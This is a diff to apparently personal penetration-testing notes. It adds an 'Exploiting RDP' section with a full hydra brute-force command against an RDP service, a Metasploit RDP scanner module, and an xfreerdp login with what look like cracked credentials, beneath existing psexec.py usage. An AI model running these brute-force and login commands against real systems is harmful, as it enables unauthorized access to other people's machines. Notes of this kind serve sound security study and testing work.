@@ -356,27 +356,17 @@ With an anonymous null session you can access the IPC$ share and interact with s
   
   Psexec.py is the python linux implementation of psexec
     Usage: psexec.py Administrator@x.x.x.x cmd.exe
+    
+    
+    
+    ### Exploiting RDP
+    
+  - RDP runs by default on TCP 3389, but be aware and always do a full scan, because some companies switch to a different port
+  - Veryfiy if a port is used for RDP with metasploit module auxiliary/scanner/rdp/rdp_scanner
+  - Bruteforce RDP with hydra: hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.0.31 -s 3333 (s specifies the Port)
   
+  - use xfreerdp to connect: xfreerdp /u:administrator /p:qwertyuiop /v:10.0.0.31:3333
   
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-
   
   
   
